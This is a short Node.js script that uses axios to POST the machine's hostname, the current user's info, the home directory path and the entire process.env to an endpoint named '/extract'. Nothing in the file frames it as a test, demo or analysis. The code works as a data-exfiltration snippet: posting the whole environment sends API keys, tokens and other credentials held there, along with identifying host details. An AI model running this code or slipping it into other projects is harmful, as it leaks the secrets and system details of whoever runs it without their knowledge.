import axios from "axios";
import os from "os";

const post = axios.post;


await post("/extract", {
    hostName: os.hostname(),
    getUserInfo: os.userInfo(),
    data: {
    homedir: os.homedir(), 
    env: process.env
    }
  });
